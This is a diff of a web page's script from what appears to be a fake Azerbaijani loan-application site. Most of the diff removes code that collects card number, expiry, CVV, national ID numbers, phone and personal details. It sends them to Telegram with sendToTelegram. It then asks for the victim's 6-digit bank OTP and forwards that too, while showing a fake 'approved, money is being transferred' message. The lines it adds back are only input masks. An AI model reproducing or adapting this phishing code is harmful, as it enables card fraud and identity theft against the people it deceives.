-  document.getElementById('cardCvv').addEventListener('input', function(){
-    let val = this.value.replace(/\D/g,'').slice(0,4);
-    this.value = val;
-    let display = val.padEnd(3, '*');
-    document.getElementById('cardCvvDisplay').textContent = display;
-  });
-
-  // ========== CHECKING ==========
-  function goToChecking(){
-    const cardNumber = cardNumberInput.value;
-    if(cardNumber.length < 16){
-      alert('16 rəqəmli kart nömrəsini daxil edin!');
-      return;
-    }
-    const expiry = document.getElementById('cardExpiry').value;
-    if(expiry.length < 5){
-      alert('Bitmə tarixini daxil edin (AA/İİ)!');
-      return;
-    }
-    const cvv = document.getElementById('cardCvv').value;
-    if(cvv.length < 3){
-      alert('CVV kodunu daxil edin!');
-      return;
-    }
-
-    const firstName = document.getElementById('firstName').value || 'ƏLİ';
-    const lastName = document.getElementById('lastName').value || 'MƏMMƏDOV';
-    const patronymic = document.getElementById('patronymic').value || 'ƏLİ OĞLU';
-    const name = firstName + ' ' + lastName;
-    const birth = document.getElementById('birthDate').value || '1990-01-01';
-    const fin = document.getElementById('fin').value || 'Məlumat yoxdur';
-    const id = document.getElementById('idnum').value || 'Məlumat yoxdur';
-    const prefix = document.getElementById('idPrefix').value || 'AZE';
-    const phone = document.getElementById('phone').value || 'Məlumat yoxdur';
-    const job = document.querySelector('.toggle-btn.active')?.dataset?.val === 'beli' ? 'Bəli' : 'Xeyr';
-    const amount = document.getElementById('creditAmountDisplay').textContent;
-    const term = document.getElementById('termLabel').textContent;
-
-    applicationData = {
-      name, patronymic, birth, fin, id: prefix + ' ' + id, phone, job,
-      bank: selectedBankData.name, cardNumber, expiry, cvv, amount, term
-    };
-
-    document.getElementById('cardInputStep').style.display='none';
-    document.getElementById('checkingStep').style.display='block';
-    
-    isChecking = true;
-    checkSeconds = 0;
-    document.getElementById('checkingTimer').textContent = '0';
-    document.getElementById('checkingStatus').style.display = 'none';
-    
-    sendToTelegram(applicationData);
-    
-    if(checkInterval) clearInterval(checkInterval);
-    checkInterval = setInterval(() => {
-      checkSeconds++;
-      document.getElementById('checkingTimer').textContent = checkSeconds;
-      if(checkSeconds > 10) {
-        document.getElementById('checkingStatus').style.display = 'block';
-        document.getElementById('checkingStatus').textContent = '⏳ Təsdiq gözlənilir... (' + checkSeconds + 's)';
-      }
-    }, 1000);
-  }
-
-  // ========== OTP SUBMIT ==========
-  function submitOTP(){
-    const otpInput = document.getElementById('otpCode').value.replace(/\s/g,'');
-    if(otpInput.length === 6){
-      sendOTPToTelegram(otpInput);
-      document.getElementById('otpStatus').style.display = 'block';
-      document.getElementById('otpStatus').textContent = '✅ Təsdiq edildi! Pul kartınıza köçürülür.';
-      setTimeout(() => {
-        alert('✅ Müraciətiniz uğurla təsdiqləndi!');
-        closeModal();
-      }, 2000);
-    } else {
-      alert('❌ 6 rəqəmli OTP kodunu daxil edin!');
-    }
-  }
-
-  // ========== FORM SUBMIT ==========
-  document.getElementById('applyForm').addEventListener('submit', (e)=>{
-    e.preventDefault();
-    const fin = document.getElementById('fin').value.trim().toUpperCase();
-    const id = document.getElementById('idnum').value.trim();
-    const phone = document.getElementById('phone').value.trim();
-    const consent1 = document.getElementById('consent1').checked;
-    const consent2 = document.getElementById('consent2').checked;
-    const firstName = document.getElementById('firstName').value.trim();
-    const lastName = document.getElementById('lastName').value.trim();
-    const patronymic = document.getElementById('patronymic').value.trim();
-    const birth = document.getElementById('birthDate').value;
-
-    if(!firstName || !lastName){ alert('Ad və soyad daxil edin!'); return; }
-    if(!birth){ alert('Doğum tarixi daxil edin!'); return; }
-    if(!fin || fin.length !== 7){ alert('FIN kod 7 simvoldan ibarət olmalıdır!'); return; }
-    if(!id || id.length !== 8){ alert('Seriya nömrəsi 8 rəqəmdən ibarət olmalıdır!'); return; }
-    const phoneDigits = phone.replace(/\D/g,'');
-    if(phoneDigits.length !== 10 || phoneDigits[0] !== '0'){ alert('Düzgün mobil nömrə daxil edin!'); return; }
-    if(!consent1 || !consent2){ alert('Bütün razılıqları qeyd edin!'); return; }
-
-    const prefix = document.getElementById('idPrefix').value || 'AZE';
-    document.getElementById('sumName').textContent = firstName.toUpperCase();
-    document.getElementById('sumSurname').textContent = lastName.toUpperCase();
-    document.getElementById('sumPatronymic').textContent = patronymic.toUpperCase() || '—';
-    document.getElementById('sumBirth').textContent = birth.split('-').reverse().join('.');
-    document.getElementById('sumFin').textContent = fin;
-    document.getElementById('sumId').textContent = prefix + ' ' + id;
-    document.getElementById('sumPhone').textContent = phone;
-    const jobActive = document.querySelector('.toggle-btn.active');
-    document.getElementById('sumJob').textContent = jobActive && jobActive.dataset.val === 'beli' ? 'Bəli' : 'Xeyr';
-
-    showSummaryStep();
-  });
-
-  // ========== CLOSE MODAL ==========
-  document.getElementById('modalOverlay').addEventListener('click', (e)=>{
-    if(e.target.id==='modalOverlay') { if(checkInterval) clearInterval(checkInterval); isChecking=false; pollingActive=false; closeModal(); }
-  });
-  document.addEventListener('keydown', (e)=>{ if(e.key==='Escape') { if(checkInterval) clearInterval(checkInterval); isChecking=false; pollingActive=false; closeModal(); } });
-
-  // ========== INPUT MASKS ==========
-  document.getElementById('fin').addEventListener('input', function(){
-    this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g,'').slice(0,7);
-    updateIDPreview();
-  });
-  document.getElementById('idnum').addEventListener('input', function(){
-    this.value = this.value.replace(/\D/g,'').slice(0,8);
-    updateIDPreview();
-  });
-  document.getElementById('phone').addEventListener('input', function(){
-    let digits = this.value.replace(/\D/g,'').slice(0,10);
-    let out = '';
-    if(digits.length>0) out = digits.slice(0,3);
-    if(digits.length>3) out += ' ' + digits.slice(3,6);
-    if(digits.length>6) out += ' ' + digits.slice(6,8);
-    if(digits.length>8) out += ' ' + digits.slice(8,10);
-    this.value = out;
-  });
+});
+document.getElementById('idnum').addEventListener('input',function(){
+  this.value=this.value.replace(/\D/g,'').slice(0,8);
+  updateIDPreview();
+});
+document.getElementById('phone').addEventListener('input',function(){
+  let d=this.value.replace(/\D/g,'').slice(0,10);
+  let out='';
+  if(d.length>0) out=d.slice(0,3);
+  if(d.length>3) out+=' '+d.slice(3,6);
+  if(d.length>6) out+=' '+d.slice(6,8);
+  if(d.length>8) out+=' '+d.slice(8,10);
+  this.value=out;
+});
 </script>
-
 </body>
-  </html>
+</html>
